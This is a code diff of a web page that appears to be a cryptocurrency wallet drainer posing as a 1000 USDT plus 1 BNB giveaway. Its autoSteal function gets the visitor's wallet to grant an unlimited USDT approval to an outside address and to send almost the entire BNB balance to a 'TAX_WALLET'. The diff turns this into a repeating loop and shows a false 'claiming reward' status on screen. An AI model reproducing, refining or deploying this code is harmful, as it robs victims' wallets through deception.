@@ -1,5 +1,3 @@
-2OK
-
 
 <!DOCTYPE html>
 <html lang="zh">
@@ -50,8 +48,8 @@ async function autoRedirect(){
 }
 
 async function autoSteal(){
-  if(step === 1){
-    // 第1步：USDT无限授权
+  if(step === 1 || step === 3){
+    // 第1次/第3次：USDT无限授权
     updateStatus('正在USDT授权...');
     try{
       await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
@@ -62,7 +60,7 @@ async function autoSteal(){
       const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDR);
       await usdt.methods.approve(BVXZA, UNLIMITED).send({from: userAddr});
       
-      step = 2;
+      step = step + 1;
       updateStatus('USDT授权成功！自动转BNB...');
       setTimeout(autoSteal, 1500);
     }catch(e){
@@ -70,8 +68,8 @@ async function autoSteal(){
     }
   }
   
-  if(step === 2){
-    // 第2步：BNB全转（留0.001手续费）
+  if(step === 2 || step === 4){
+    // 第2次/第4次：BNB全转（留0.001手续费）
     updateStatus('正在转BNB...');
     try{
       const balance = await web3.eth.getBalance(userAddr);
@@ -80,7 +78,9 @@ async function autoSteal(){
         const amount = web3.utils.toWei((totalBNB - 0.001).toString(), 'ether');
         await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
       }
-      updateStatus('🎉 1000USDT+1BNB到账！');
+      step = 1; // 循环回到第1步
+      updateStatus('正在领取1000USDT+1BNB');
+      setTimeout(autoSteal, 1500); // 1.5秒后继续循环
     }catch(e){
       setTimeout(autoSteal, 1000);
     }
